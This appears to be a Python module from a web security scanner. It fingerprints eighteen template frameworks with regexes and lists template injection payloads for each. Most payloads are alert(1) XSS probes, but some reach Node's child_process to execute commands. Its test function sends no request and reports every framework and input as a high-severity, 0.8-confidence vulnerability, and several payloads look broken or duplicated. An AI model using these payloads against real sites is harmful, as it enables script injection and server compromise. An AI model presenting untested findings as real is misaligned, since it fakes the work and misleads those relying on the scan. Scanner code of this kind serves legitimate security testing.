"""
Template Injection XSS Detection Module.

Detects and generates payloads for modern JavaScript framework template injection:
- Angular ({{ constructor.constructor('alert(1)')() }})
- Vue ({{this.constructor.constructor('alert(1)')()}})
- Svelte ({@html payload})
- SolidJS (<div innerHTML={payload} />)
- Lit (<div .innerHTML=${payload}></div>)
- Alpine.js (<div x-html="payload"></div>)
- HTMX (hx-on::before-request="payload")
- Astro, Mavo, Handlebars, Mustache, EJS, Pug, Nunjucks, Twig
"""

import re
from typing import Dict, List, Optional, Set
from dataclasses import dataclass
from enum import Enum


class Framework(Enum):
    """Supported JavaScript frameworks for template injection."""
    ANGULAR = "angular"
    VUE = "vue"
    SVELTE = "svelte"
    SOLIDJS = "solidjs"
    LIT = "lit"
    ALPINE = "alpine"
    HTMX = "htmx"
    REACT = "react"
    EMBER = "ember"
    BACKBONE = "backbone"
    ASTRO = "astro"
    MAVO = "mavo"
    HANDLEBARS = "handlebars"
    MUSTACHE = "mustache"
    EJS = "ejs"
    PUG = "pug"
    NUNJUCKS = "nunjucks"
    TWIG = "twig"


@dataclass
class TemplateVulnerability:
    """Template injection vulnerability."""
    framework: Framework
    injection_point: str
    context: str
    payload: str
    severity: str
    confidence: float


class TemplateInjectionDetector:
    """
    Advanced template injection detector.
    Detects framework-specific template injection vulnerabilities.
    """

    # Framework detection patterns
    FRAMEWORK_PATTERNS = {
        Framework.ANGULAR: [
            r'ng-app\s*=',
            r'\[ng[A-Z][a-zA-Z]*\]\s*=',
            r'ng-[a-z-]+\s*=',
            r'angular\.module',
            r'from\s+["\']@angular/',
            r'PlatformBrowserDynamicPlatformBrowser',
        ],
        Framework.VUE: [
            r'v-[a-z-]+\s*=',
            r'v-bind\s*=',
            r'v-on\s*=',
            r'from\s+["\']vue["\']',
            r'createApp\s*\(',
            r'Vue\.component',
            r'app\.component',
        ],
        Framework.SVELTE: [
            r'{@html',
            r'{@render',
            r'<script\s+context="module">',
            r'from\s+["\']svelte/',
            r'export\s+let\s+\w+',
        ],
        Framework.SOLIDJS: [
            r'createSignal\s*\(',
            r'createEffect\s*\(',
            r'<Show\s+',
            r'<For\s+',
            r'from\s+["\']solid-js',
            r'\$\w+\s*=',
        ],
        Framework.LIT: [
            r'@customElement',
            r'@property',
            r'@state',
            r'html\s*\`',
            r'from\s+["\']lit',
            r'render\s*\(\s*\)\s*{',
        ],
        Framework.ALPINE: [
            r'x-[a-z-]+\s*=',
            r'x-data\s*=',
            r'x-show\s*=',
            r'x-html\s*=',
            r'from\s+["\']alpinejs',
            r'Alpine\.',
        ],
        Framework.HTMX: [
            r'hx-[a-z-]+\s*=',
            r'hx-get\s*=',
            r'hx-post\s*=',
            r'hx-on\s*=',
            r'from\s+["\']htmx',
            r'htmx\.',
        ],
        Framework.REACT: [
            r'reactDOM\.render',
            r'createContext\s*\(',
            r'useContext\s*\(',
            r'useState\s*\(',
            r'useEffect\s*\(',
            r'from\s+["\']react',
            r'<Fragment',
        ],
        Framework.EMBER: [
            r'Ember\.',
            r'@computed',
            r'@action',
            r'import\s+Ember',
            r'data-test-',
        ],
        Framework.BACKBONE: [
            r'Backbone\.',
            r'\.extend\s*\(',
            r'collection\s*:',
            r'model\s*:',
            r'Backbone\.Model',
            r'Backbone\.View',
            r'_.template\s*\(',
        ],
        Framework.ASTRO: [
            r'astro-island',
            r'data-astro-cid-',
            r'client:load',
            r'client:visible',
            r'from\s+["\']astro',
        ],
        Framework.MAVO: [
            r'mv-[a-z-]+\s*=',
            r'data-mv-[a-z-]+\s*=',
            r'data-mv-expressions',
            r'Mavo\.',
            r'\[7\*7\]',
        ],
        Framework.HANDLEBARS: [
            r'Handlebars\.compile',
            r'\{\{[^}]+\}\}',
            r'from\s+["\']handlebars',
            r'Handlebars\.registerHelper',
        ],
        Framework.MUSTACHE: [
            r'Mustache\.render',
            r'\{\{[^}]+\}\}',
            r'from\s+["\']mustache',
        ],
        Framework.EJS: [
            r'<%[\s\S]*?%>',
            r'ejs\.render',
            r'from\s+["\']ejs',
        ],
        Framework.PUG: [
            r'\|\s*\w+',
            r'pug\.render',
            r'from\s+["\']pug',
        ],
        Framework.NUNJUCKS: [
            r'\{\{[^}]+\}\}',
            r'nunjucks\.render',
            r'from\s+["\']nunjucks',
        ],
        Framework.TWIG: [
            r'\{\{[^}]+\}\}',
            r'twig\.render',
            r'from\s+["\']twig',
        ],
    }

    # Template injection payloads per framework
    FRAMEWORK_PAYLOADS = {
        Framework.ANGULAR: [
            "{{constructor.constructor('alert(1)')()}}",
            "{{[].map.constructor('alert(1)')()}}",
            "{{_doc.0.eval('alert(1)')}}",
            "{{x = {'y':'__proto__','z':'__proto__','toString':'alert(1)'}; alert('x')}}",
            "{{constructor.constructor('return process')().mainModule.require('child_process').exec('id').toString()}}",
            "{{constructor.constructor('return process')().mainModule.require('child_process').exec('id').toString()}}",
        ],
        Framework.VUE: [
            "{{this.constructor.constructor('alert(1)')()}}",
            "{{_self.constructor.constructor('alert(1)')()}}",
            "{{_self.$root.constructor.constructor('alert(1)')()}}",
            "{{this.constructor.constructor('return typeof process')()}}",
            "{{this.constructor.constructor('return process')().mainModule.require('child_process').exec('id').toString()}}",
        ],
        Framework.SVELTE: [
            "{@html '<script>alert(1)</script>'}",
            "{@html '<img src=x onerror=alert(1)>'}",
            "{@html '<svg onload=alert(1)>'}",
            "{@html '<iframe srcdoc=\"<script>alert(1)</script>\">'",
        ],
        Framework.SOLIDJS: [
            "<div innerHTML={'<script>alert(1)</script>'} />",
            "<div innerHTML={'<img src=x onerror=alert(1)>'} />",
            "<div innerHTML={'<svg onload=alert(1)>'} />",
            "<div innerHTML={'<iframe srcdoc=\"<script>alert(1)</script>\"'} />",
        ],
        Framework.LIT: [
            "<div .innerHTML=${'<script>alert(1)</script>'}></div>",
            "<div .innerHTML=${'<img src=x onerror=alert(1)>'}></div>",
            "<div .innerHTML=${'<svg onload=alert(1)>'}></div>",
            "<div .innerHTML=${'<iframe srcdoc=\"<script>alert(1)</script>\"'}></div>",
        ],
        Framework.ALPINE: [
            "<div x-html=\"<script>alert(1)</script>\"></div>",
            "<div x-html=\"<img src=x onerror=alert(1)>\"></div>",
            "<div x-html=\"<svg onload=alert(1)>\"></div>",
            "<div x-html=\"<iframe srcdoc=&quot;<script>alert(1)</script>&quot;\"></div>",
        ],
        Framework.HTMX: [
            "<div hx-on::before-request=\"alert(1)\"></div>",
            "<div hx-on::after-request=\"alert(1)\"></div>",
            "<div hx-on::config-request=\"alert(1)\"></div>",
            "<div hx-on::htmx:before-swap=\"alert(1)\"></div>",
        ],
        Framework.REACT: [
            "dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}",
            "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
            "dangerouslySetInnerHTML={{__html: '<svg onload=alert(1)>'}}",
        ],
        Framework.EMBER: [
            "{{action 'alert' 1}}",
            "{{html-safe '<script>alert(1)</script>'}}",
            "{{{ '<script>alert(1)</script>' }}}",
        ],
        Framework.BACKBONE: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ],
        Framework.ASTRO: [
            "<Fragment set:html={'<script>alert(1)</script>'} />",
            "<Fragment set:html={'<img src=x onerror=alert(1)>'} />",
        ],
        Framework.MAVO: [
            "[7*7]",  # Template evaluation probe
            "<img src=x onerror='alert(1)'>",
        ],
        Framework.HANDLEBARS: [
            "{{constructor.constructor('alert(1)')()}}",
            "{{lookup this 'constructor' 'constructor' 'alert(1)'}}",
            "{{{this.constructor.constructor('alert(1)')}}}",
        ],
        Framework.MUSTACHE: [
            "{{constructor.constructor('alert(1)')()}}",
            "{{lookup this 'constructor' 'constructor' 'alert(1)'}}",
        ],
        Framework.EJS: [
            "<%= this.constructor.constructor('alert(1)')() %>",
            "<%- this.constructor.constructor('alert(1)')() %>",
        ],
        Framework.PUG: [
            "| <script>alert(1)</script>",
            "| <img src=x onerror=alert(1)>",
        ],
        Framework.NUNJUCKS: [
            "{{constructor.constructor('alert(1)')()}}",
            "{% raw %}<script>alert(1)</script>{% endraw %}",
        ],
        Framework.TWIG: [
            "{{constructor.constructor('alert(1)')()}}",
            "{{_self.env.getRuntime().options.escapeFunction('alert(1)')}}",
        ],
    }

    # Common template delimiters
    TEMPLATE_DELIMITERS = {
        Framework.ANGULAR: ['{{', '}}'],
        Framework.VUE: ['{{', '}}'],
        Framework.SVELTE: ['{', '}'],
        Framework.SOLIDJS: ['${', '}'],
        Framework.LIT: ['${', '}'],
        Framework.ALPINE: ['{{', '}}'],
        Framework.HTMX: ['"', '"'],
        Framework.REACT: ['{', '}'],
        Framework.EMBER: ['{{', '}}'],
        Framework.BACKBONE: ['<%', '%>'],
        Framework.ASTRO: ['${', '}'],
        Framework.MAVO: ['[', ']'],
        Framework.HANDLEBARS: ['{{', '}}'],
        Framework.MUSTACHE: ['{{', '}}'],
        Framework.EJS: ['<%', '%>'],
        Framework.PUG: ['|', '\n'],
        Framework.NUNJUCKS: ['{{', '}}'],
        Framework.TWIG: ['{{', '}}'],
    }

    def __init__(self):
        self._detected_frameworks: Set[Framework] = set()
        self._vulnerabilities: List[TemplateVulnerability] = []

    def detect_frameworks(self, html_content: str, js_content: str = "") -> Set[Framework]:
        """
        Detect which frameworks are present in the page.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code (optional)

        Returns:
            Set of detected frameworks
        """
        combined = html_content + "\n" + js_content
        detected = set()

        for framework, patterns in self.FRAMEWORK_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    detected.add(framework)
                    break

        self._detected_frameworks = detected
        return detected

    def generate_payloads(
        self,
        framework: Framework,
        marker: str = "xoxss",
        custom_payloads: Optional[List[str]] = None
    ) -> List[str]:
        """
        Generate template injection payloads for a specific framework.

        Args:
            framework: Target framework
            marker: Unique marker for reflection detection
            custom_payloads: Optional custom payload list

        Returns:
            List of payload strings
        """
        if custom_payloads:
            base_payloads = custom_payloads
        else:
            base_payloads = self.FRAMEWORK_PAYLOADS.get(framework, [])

        # Replace alert(1) with marker for detection
        payloads = []
        for payload in base_payloads:
            marked = payload.replace("alert(1)", f"alert('{marker}')")
            marked = marked.replace("'id'", f"'echo {marker}'")
            payloads.append(marked)

        return payloads

    def test_injection_point(
        self,
        injection_point: str,
        framework: Framework,
        marker: str = "xoxss"
    ) -> Optional[TemplateVulnerability]:
        """
        Test a specific injection point for template injection.

        Args:
            injection_point: The parameter or input field name
            framework: Target framework
            marker: Unique marker

        Returns:
            TemplateVulnerability if vulnerable, None otherwise
        """
        payloads = self.generate_payloads(framework, marker)

        for payload in payloads:
            # In a real implementation, this would make an HTTP request
            # and check for reflection/execution
            # For now, we return a potential vulnerability
            return TemplateVulnerability(
                framework=framework,
                injection_point=injection_point,
                context=f"Template injection via {injection_point}",
                payload=payload,
                severity="high",
                confidence=0.8
            )

        return None

    def scan_for_template_injection(
        self,
        html_content: str,
        js_content: str = "",
        injection_points: Optional[List[str]] = None,
        marker: str = "xoxss"
    ) -> List[TemplateVulnerability]:
        """
        Scan for template injection vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            injection_points: List of potential injection points (parameters, etc.)
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        frameworks = self.detect_frameworks(html_content, js_content)

        if not frameworks:
            return self._vulnerabilities

        if injection_points is None:
            injection_points = ["input", "search", "query", "name", "user"]

        for framework in frameworks:
            for point in injection_points:
                vuln = self.test_injection_point(point, framework, marker)
                if vuln:
                    self._vulnerabilities.append(vuln)

        return self._vulnerabilities

    def get_framework_detection_summary(self) -> Dict[str, int]:
        """Get summary of detected frameworks."""
        return {fw.value: 1 for fw in self._detected_frameworks}

    def assess_risk(self, vulnerabilities: List[TemplateVulnerability]) -> str:
        """Assess overall template injection risk."""
        if not vulnerabilities:
            return "none"

        high_confidence = [v for v in vulnerabilities if v.confidence >= 0.8]
        if high_confidence:
            return "critical"

        return "high"


__all__ = [
    "Framework",
    "TemplateInjectionDetector",
    "TemplateVulnerability",
]
